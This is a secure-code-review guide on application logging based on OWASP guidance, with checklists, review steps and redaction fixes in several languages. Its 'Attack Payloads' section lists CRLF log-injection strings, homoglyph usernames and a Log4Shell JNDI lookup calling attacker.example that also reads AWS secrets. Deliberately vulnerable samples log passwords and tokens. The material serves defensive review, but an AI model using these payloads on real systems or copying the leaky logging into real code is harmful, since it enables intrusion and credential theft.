---
title: Review Secure Logging
keywords:
  - security code review
  - secure logging
  - log injection
  - sensitive data exposure
  - OWASP logging
description: How to review application logging against OWASP guidance on what to log, what not to log, and appropriate log levels.
---

## 4.39 - Review Secure Logging

Secure logging balances auditability with data protection. Review log statements in authentication, payment, and admin flows. Confirm the application records security-relevant events per [OWASP logging guidance](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html) and never writes passwords, session tokens, or payment data into log files.

## What This Vulnerability Is

Logs are a secondary data store. They often have weaker access controls than production databases, longer retention, and broad read access for operations teams. When applications log secrets, session identifiers, or personal data, a log breach may cause the same harm as a database leak. Missing security events—failed logins, authorization denials, admin actions—blind incident response and forensics.

The unsafe assumption is that logs are internal and therefore safe for verbose output. Attackers who compromise log aggregation, support staff with read access, or misconfigured S3 buckets may exfiltrate logged credentials. Reviewers should treat every log line as persistent and potentially exposed. This relates to [CWE-532](https://cwe.mitre.org/data/definitions/532.html) (Insertion of Sensitive Information into Log File).

## Vulnerability Characteristics (Where to Identify Them)

| Signal | Where to look |
| --- | --- |
| **Feature type** | Login, logout, password reset, payment, admin config, file upload handlers |
| **Secret leakage** | Logged passwords, API keys, `Authorization` headers, cookies, connection strings |
| **Missing audit events** | Auth flows without success/failure logging, absent logout and password-change records |
| **PII and PCI** | Full card numbers, bank accounts, government IDs, health data in log fields |
| **Oververbose debug** | `logger.debug(request)` serializing entire HTTP requests in production paths |
| **Log injection** | User input embedded in log messages without sanitization |
| **Admin activity gaps** | Privileged actions without immutable audit trail |

## Attack Payloads

Use these in authorized tests when user input appears in log messages or when reviewing log aggregation exposure.

### Pattern 1: Log injection (CRLF / forged lines)

```text
username=admin%0aINFO User admin logged out successfully
username=legit%0d%0aERROR Security audit: privilege escalation approved
event=checkout%0a2024-06-01 WARN refund approved txn=99999 amount=50000
```

Forged newlines may confuse operators or SIEM parsers that treat each line as a separate event.

### Pattern 2: Log forging via Unicode / homoglyphs

```text
username=аdmin  # Cyrillic 'а' — looks like "admin" in log review
username=\u001b[31madmin  # ANSI escape in terminals that render color
```

### Pattern 3: Sensitive data in query strings (Referer leakage)

```text
GET /login?username=victim&password=Secret123
Referer: https://app.example/dashboard?token=eyJhbG...
```

Even when not logged by the app, proxies and analytics may capture query parameters.

### Pattern 4: Verbose exception logging

```text
# Trigger validation error; stack trace includes:
# connection string, API key in local variable dump, Authorization header
```

### Pattern 5: Log4Shell-style JNDI (legacy)

```text
${jndi:ldap://attacker.example/a}
${env:AWS_SECRET_ACCESS_KEY}
```

Review JNDI lookup patterns in Java logging configuration for legacy deployments.

## Language-Specific Sinks and Dangerous APIs

### Python

```python
app.logger.info("Login user=%s password=%s", user, password)
logger.debug("Request: %s", request)  # entire Flask/Django request
logger.info(f"Token: {token}")
structlog.get_logger().info("auth", authorization=headers["Authorization"])
print(request.headers)  # stdout captured by container logs
logging.basicConfig(level=logging.DEBUG)  # in production settings
```

Also review: `urllib3` debug, SQLAlchemy `echo=True`, Celery task logs with args.

### Java

```java
logger.info("Login user={} password={}", username, password);
log.debug("JWT {}", jwtToken);
System.out.println("DB URL: " + jdbcUrl);
log.error("Failed payment", exception);  // exception message contains PAN
MDC.put("ssn", ssn);  // mapped diagnostic context in every line
org.apache.logging.log4j.core.lookup.JndiLookup  // legacy config
```

### C#

```csharp
_logger.LogInformation("Password {Password}", password);
_logger.LogDebug("Request {@Request}", request);  // destructures all properties
Console.WriteLine($"Connection: {connectionString}");
_logger.LogError(ex, "Payment failed for {Pan}", cardNumber);
Serilog destructuring of sensitive objects without masking
```

### Go

```go
log.Printf("login user=%s password=%s", user, pass)
log.Printf("auth header=%s", r.Header.Get("Authorization"))
fmt.Println(req)  // httputil.DumpRequest output
zap.String("token", token)
log.SetFlags(log.LstdFlags | log.Lshortfile) // with secrets in messages
```

### JavaScript

```javascript
console.log('User login:', { username, password });
console.log('Headers:', req.headers);
logger.info(`Stripe key: ${process.env.STRIPE_SECRET}`);
debug('session', req.session);  // debug package in production
```

### Shell / infrastructure

```bash
export DATABASE_URL="postgres://user:pass@host/db"  # visible in /proc, docker inspect
kubectl logs deployment/api  # env vars printed at startup
```

## Sample Vulnerable Code in Python

```python
from flask import Flask, request

app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    # Password written to logs — credential exposure if logs are copied or breached
    app.logger.info("Login attempt user=%s password=%s", username, password)
    if authenticate(username, password):
        app.logger.info("Login ok session=%s", create_session(username))
        return redirect("/dashboard")
    return "failed", 401

@app.route("/reset", methods=["POST"])
def reset_password():
    email = request.form["email"]
    token = issue_reset_token(email)
    app.logger.info("Reset link for %s: %s", email, token)
    return "", 204
```

## Step-by-Step Review Walkthrough

1. **Search log calls near auth flows.** Review login, logout, password reset, registration, and role change handlers.
2. **Verify security events are recorded.** Authorization failures, validation failures, and sensitive resource access should produce audit records.
3. **Inspect catch blocks and error handlers.** Stack traces belong in server logs, not user responses, but must still avoid secrets.
4. **Review structured logging fields.** JSON loggers may embed entire request objects including headers and bodies.
5. **Check debug and trace gating.** Confirm production defaults suppress verbose PII dumps.
6. **Follow log shipping.** Ensure retention and access controls on SIEM or cloud logging match data classification.
7. **Confirm log injection defenses.** Sanitize or encode user input embedded in log messages to prevent forged log lines.

## Risk Impact Analysis

**Credential and token exposure.** Logged passwords and bearer tokens may be read by anyone with log platform access or after a bucket misconfiguration.

**PCI and privacy violations.** Cardholder data and regulated personal information in logs expand compliance scope and breach notification obligations.

**Blind incident response.** Missing login failure and admin action logs delay detection and forensics after compromise.

**Session hijacking.** Logged session IDs and JWTs let attackers replay sessions if logs are exfiltrated.

**Log injection and forgery.** Unsanitized user input in log messages may trick operators or SIEM rules during investigations.

## Vulnerable Examples in Other Languages

### Java

```java
logger.info("Login attempt user={} password={}", username, password);

public void login(String username, String password) {
    if (authenticate(username, password)) {
        String sessionId = createSession(username);
        logger.info("Login ok session={}", sessionId);
    }
}

logger.info("Reset link for {}: {}", email, resetToken);
logger.error("DB connection failed: {}", jdbcUrlWithCredentials);
```

### C#

```csharp
_logger.LogInformation("Login attempt user={User} password={Password}", username, password);

_logger.LogInformation("User {UserId} authenticated with token {Token}", userId, accessToken);
_logger.LogInformation("Reset link for {Email}: {Token}", email, resetToken);
_logger.LogError(ex, "Payment failed for card {Pan}", payment.CardNumber);
```

### Go

```go
func login(w http.ResponseWriter, r *http.Request) {
    user := r.FormValue("username")
    pass := r.FormValue("password")
    log.Printf("login attempt user=%s password=%s", user, pass)
    if authenticate(user, pass) {
        sid := createSession(user)
        log.Printf("login ok session=%s auth=%s", sid, r.Header.Get("Authorization"))
    }
}

func reset(w http.ResponseWriter, r *http.Request) {
    token := issueResetToken(r.FormValue("email"))
    log.Printf("issued reset token=%s for %s", token, r.FormValue("email"))
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Log security events with correlation IDs, not credentials. Redact sensitive keys in structured logs.

```python
import logging
import structlog

def redact_sensitive(_, __, event_dict):
    for key in ("password", "token", "authorization", "cookie"):
        if key in event_dict:
            event_dict[key] = "[REDACTED]"
    return event_dict

structlog.configure(processors=[redact_sensitive, structlog.processors.JSONRenderer()])
log = structlog.get_logger()

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    if authenticate(username, password):
        log.info("login_success", user_id=user_id_for(username), event="LOGIN_SUCCESS")
        return redirect("/dashboard")
    log.warning("login_failure", username=username, event="LOGIN_FAILURE")
    return "failed", 401
```

Set `LOG_LEVEL=INFO` in production. See [Python logging](https://docs.python.org/3/library/logging.html) and [structlog](https://www.structlog.org/en/stable/).

### Java

Use parameterized logging without secrets. Add redaction filters for known patterns.

```java
logger.info("Login attempt user={} outcome={}", username, success ? "SUCCESS" : "FAILURE");

public class RedactFilter extends Filter<ILoggingEvent> {
    @Override
    public FilterReply decide(ILoggingEvent event) {
        if (event.getFormattedMessage().contains("password=")) {
            return FilterReply.DENY;
        }
        return FilterReply.NEUTRAL;
    }
}
```

Align event coverage with [OWASP Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/) logging requirements.

### C#

Use ILogger with explicit templates. Mask sensitive properties in Serilog destructuring.

```csharp
_logger.LogInformation("Login {Outcome} for user {UserId}", outcome, userId);

Log.Logger = new LoggerConfiguration()
    .Destructure.ByTransforming<PaymentInfo>(p => new { p.TransactionId, Pan = "[REDACTED]" })
    .CreateLogger();
```

Configure [Application Insights telemetry filters](https://learn.microsoft.com/en-us/azure/azure-monitor/app/api-filtering-sampling) to drop Authorization headers.

### Go

Log user IDs and correlation IDs, not raw Authorization headers or passwords.

```go
logger.Info("login",
    zap.String("event", "LOGIN_SUCCESS"),
    zap.String("user_id", userID),
    zap.String("correlation_id", correlationID),
)

func auditAdmin(action, actor string) {
    auditLogger.Info(action,
        zap.String("actor", actor),
        zap.Time("at", time.Now().UTC()),
    )
}
```

Never dump full requests with [httputil.DumpRequest](https://pkg.go.dev/net/http/httputil#DumpRequest) in production middleware.

## Verify During Review

Per [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html), the application logs these security-relevant events:

- All login attempts — successful and unsuccessful
- Log-outs
- Password changes and reset attempts
- User creation and removal, and changes to a user's authorization
- Authorization failures when a user is denied access to a resource
- Input validation failures, such as unexpected values from dropdown lists
- System administration activity
- Integrity events and submission of user-generated content — especially file uploads
- Access to sensitive data such as payment card information and keys

Per OWASP guidance, logs must never contain:

- Application source code and commercially sensitive information
- Session IDs, access tokens, and authentication passwords
- Sensitive personal data, bank account, or payment cardholder data
- Database connection strings, encryption keys, and other secrets
- Information that is illegal to collect or that the user has opted out of collecting

Additional review checks:

- Production log level defaults to INFO or WARN; DEBUG and TRACE do not emit PII in steady state.
- Error responses to users remain generic while server-side logs capture detail without secrets.
- Log aggregation storage has encryption, retention limits, and role-based access aligned with compliance needs.

## Reference

- [CWE-532: Insertion of Sensitive Information into Log File](https://cwe.mitre.org/data/definitions/532.html)
- [CWE-117: Improper Output Neutralization for Logs](https://cwe.mitre.org/data/definitions/117.html)
- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
- [OWASP Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/)
- [Python logging documentation](https://docs.python.org/3/library/logging.html)
- [structlog documentation](https://www.structlog.org/en/stable/)
- [SLF4J manual](https://www.slf4j.org/manual.html)
- [Serilog destructuring](https://github.com/serilog/serilog/wiki/Structured-Data)
- [Go zap logger](https://pkg.go.dev/go.uber.org/zap)
